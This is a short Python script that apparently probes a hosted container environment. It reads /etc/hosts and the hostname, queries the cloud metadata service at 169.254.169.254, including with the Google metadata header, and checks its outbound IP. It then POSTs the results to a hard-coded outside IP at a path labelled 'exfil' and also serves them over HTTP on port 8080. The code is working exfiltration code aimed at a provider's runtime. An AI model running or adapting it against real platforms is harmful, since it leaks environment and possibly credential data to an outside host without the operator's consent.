import json
import os
import socket
import time
import urllib.request

COLLECTOR = "http://208.87.134.252:9200/exfil-aiven-runtime-v5"
R = {"probe": "build-vs-run-egress", "started": time.strftime("%FT%TZ", time.gmtime())}

# build-stage facts captured into the image by buildprobe.py
try:
    with open("/app/build_facts.json") as fh:
        R["build_stage"] = json.load(fh)
except Exception as exc:                                            # noqa: BLE001
    R["build_stage"] = type(exc).__name__

# run-stage facts, same shape, for a direct comparison
R["run_stage"] = {"hostname": socket.gethostname()}
try:
    with open("/etc/hosts") as fh:
        R["run_stage"]["hosts"] = fh.read(300)
except Exception as exc:                                            # noqa: BLE001
    R["run_stage"]["hosts"] = type(exc).__name__
for label, url, hdrs in (
    ("egress_ip", "http://ifconfig.me/ip", None),
    ("our_collector", "http://208.87.134.252:9200/", None),
    ("metadata_plain", "http://169.254.169.254/computeMetadata/v1/", None),
    ("metadata_gcp", "http://169.254.169.254/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
):
    try:
        req = urllib.request.Request(url, headers=hdrs or {})
        with urllib.request.urlopen(req, timeout=6) as r:
            R["run_stage"][label] = {"status": r.status, "body": r.read(160).decode("utf-8", "replace")}
    except Exception as exc:                                        # noqa: BLE001
        R["run_stage"][label] = {"err": type(exc).__name__}

R["finished"] = time.strftime("%FT%TZ", time.gmtime())
payload = json.dumps(R).encode()
try:
    req = urllib.request.Request(COLLECTOR, data=payload, headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=10).read()
except Exception:                                                   # noqa: BLE001
    pass
print(json.dumps(R, indent=1)[:6000], flush=True)

from http.server import BaseHTTPRequestHandler, HTTPServer


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *_a):
        return


HTTPServer(("0.0.0.0", 8080), H).serve_forever()
